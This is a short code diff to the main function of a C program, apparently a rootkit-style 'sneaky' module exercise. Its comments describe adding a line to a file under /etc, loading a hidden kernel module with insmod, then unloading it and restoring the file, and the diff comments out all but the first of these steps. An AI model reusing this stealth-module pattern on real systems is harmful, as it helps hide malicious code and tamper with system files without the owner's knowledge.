@@ -165,18 +165,18 @@ int main(){
   add_sneaky_line(etc);
   
   //Load the sneaky module using the insmod command
-  load_module();
+  //  load_module();
 
   //Enter a loop when the module is being uploaded
-  loop();
+  // loop();
 
   //Exit from the loop suggests removing the module using rmmod
-  unload_module();
+  // unload_module();
 
   //Restore the original file
-  copy_file(temp, etc);
+  // copy_file(temp, etc);
 
   //Delete the content of tmp file
-  fopen(temp, "w");
+  // fopen(temp, "w");
   
 }
